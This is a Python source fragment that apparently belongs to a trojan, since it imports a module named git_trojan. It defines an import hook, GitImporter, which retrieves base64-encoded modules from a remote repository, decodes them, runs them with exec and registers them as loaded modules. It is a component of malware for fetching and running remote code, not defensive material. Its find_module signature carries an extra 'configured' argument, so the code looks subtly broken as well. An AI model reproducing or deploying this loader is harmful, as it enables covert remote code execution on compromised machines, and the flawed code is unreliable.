# -*- coding: utf-8 -*-
import base64
import types
import sys
import git_trojan

class GitImporter(object):
    def __init__(self):
        self.current_module_code =""
    
    def find_module(self, fullname, configured, path = None):
        if configured:
            print("[*] Attempting to retrieve %s" % fullname)
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None
    
    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module


